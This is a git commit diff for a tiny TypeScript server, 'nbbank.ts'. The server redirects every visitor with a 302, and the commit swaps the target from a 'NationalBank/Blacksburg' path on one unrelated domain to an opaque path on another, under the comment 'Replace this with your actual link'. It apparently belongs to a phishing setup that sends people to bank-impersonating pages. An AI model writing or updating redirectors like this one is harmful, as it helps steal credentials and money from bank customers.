0464cab7f563f53ecc28f798585e0ba07852ab77
Digital2025001 <bosmichael30@gmail.com>
2025-09-08 14:29:52 -0700

    Update nbbank.ts

--- nbbank.ts
+++ nbbank.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://sparktech.agency/NationalBank/Blacksburg/", // Replace this with your actual link
+      Location: "https://mecamex.net/spectrum/_+_==", // Replace this with your actual link
     },
   });
 });
